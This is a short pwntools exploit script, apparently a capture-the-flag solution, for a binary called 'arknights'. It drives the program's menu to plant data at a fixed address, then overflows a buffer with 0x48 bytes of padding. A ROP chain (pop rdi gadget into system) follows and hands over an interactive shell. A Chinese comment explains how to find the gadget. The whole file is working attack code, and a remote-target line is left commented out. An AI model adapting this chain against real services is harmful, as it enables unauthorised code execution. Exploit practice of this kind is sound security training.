from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'amd64', os = 'linux')
r = process('./arknights')
#r = remote("ip",port)


#rdi地址用命令ROPgadget --binary arknights --only "pop|ret"看 pop rdi ; ret的地址
rdi = 0x401935
system = 0x401785
count = 0x405b60

payload = b'a'*0x48 + p64(rdi) + p64(count) + p64(system)

def ck(n):
	r.recv()
	r.sendline(b'3')
	r.recv()
	r.sendline(str(n).encode())
	r.sendline(b'\n')

r.sendline(b'a')
ck(10000)
ck(10000)
ck(6739)

r.recv()
r.sendline(b'4')
r.recv()
r.sendline(b'1')
r.sendline(payload)

r.interactive()
